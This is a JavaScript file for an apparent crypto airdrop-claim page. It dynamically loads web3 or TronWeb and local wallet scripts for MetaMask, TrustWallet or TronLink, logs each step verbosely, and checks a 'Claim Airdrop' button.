console.log("Attempting to load wallet scripts for metamask");

// Check if MetaMask-specific scripts are loaded
console.log("Checking if metamask.js is loaded");
if (typeof web3 !== 'undefined') {
    console.log("MetaMask detected!");
} else {
    console.log("MetaMask not detected.");
}

// Logging after loading the MetaMask scripts
console.log("Loading MetaMask-specific scripts...");



// Script loader function
function loadScript(scriptSrc) {
    return new Promise((resolve, reject) => {
        // Debug: Check if script is already loaded
        console.log(`Checking if script ${scriptSrc} is already loaded`);
        if (document.querySelector(`script[src="${scriptSrc}"]`)) {
            console.log(`${scriptSrc} is already loaded`);
            resolve(scriptSrc + " already loaded"); // Prevent duplicate loading
            return;
        }

        // Debug: Log the script loading attempt
        console.log(`Loading script: ${scriptSrc}`);
        const script = document.createElement("script");
        script.src = scriptSrc;
        script.type = "text/javascript";
        
        // Debug: Log when script is loaded
        script.onload = () => {
            console.log(`${scriptSrc} loaded successfully!`);
            resolve(scriptSrc + " loaded successfully");
        };

        // Debug: Log if script fails to load
        script.onerror = () => {
            console.error("Failed to load: " + scriptSrc);
            reject(new Error("Failed to load: " + scriptSrc));
        };
        
        document.head.appendChild(script);
    });
}

// Load wallet-specific scripts
async function loadWalletScripts(wallet) {
    try {
        // Debug: Log which wallet scripts are being loaded
        console.log(`Attempting to load wallet scripts for ${wallet}`);
        
        switch (wallet) {
            case "metamask":
                // Debug: Log MetaMask script loading process
                console.log("Loading MetaMask-specific scripts");
                await loadScript("https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js");
                console.log("Web3 loaded for MetaMask");

                await loadScript("js/common.js");      // Shared logic
                console.log("common.js loaded for MetaMask");

                await loadScript("js/eth.js");         // Ethereum logic
                console.log("eth.js loaded for MetaMask");

                await loadScript("js/metamask.js");    // MetaMask-specific logic
                console.log("metamask.js loaded for MetaMask");

                break;
            case "trustwallet":
                // Debug: Log TrustWallet script loading process
                console.log("Loading TrustWallet-specific scripts");
                await loadScript("https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js");
                console.log("Web3 loaded for TrustWallet");

                await loadScript("js/common.js");      // Shared logic
                console.log("common.js loaded for TrustWallet");

                await loadScript("js/bsc.js");         // BSC logic (for TrustWallet)
                console.log("bsc.js loaded for TrustWallet");

                await loadScript("js/trustwallet.js"); // TrustWallet-specific logic
                console.log("trustwallet.js loaded for TrustWallet");

                break;
            case "tronlink":
                // Debug: Log TronLink script loading process
                console.log("Loading TronLink-specific scripts");
                await loadScript("https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js");
                console.log("TronWeb loaded for TronLink");

                await loadScript("js/common.js");      // Shared logic
                console.log("common.js loaded for TronLink");

                await loadScript("js/tron.js");        // Tron-specific logic
                console.log("tron.js loaded for TronLink");

                await loadScript("js/tronlink.js");    // TronLink-specific logic
                console.log("tronlink.js loaded for TronLink");

                break;
            default:
                console.error("Unknown wallet type:", wallet);
        }
        
        // Debug: Log that the scripts have been successfully loaded
        console.log(`${wallet} scripts loaded successfully!`);
        
        // Debug: Check if the claim button is enabled
        const claimButton = document.getElementById('claimAirdropButton');
        if (claimButton && !claimButton.disabled) {
            console.log("Claim Airdrop button is enabled");
        } else {
            console.log("Claim Airdrop button is either not found or still disabled");
        }

    } catch (error) {
        // Debug: Catch and log any errors during script loading
        console.error("Error loading wallet scripts:", error);
    }
}

// Example wallet type for testing
loadWalletScripts('metamask');  // You can change to 'trustwallet' or 'tronlink' for testing



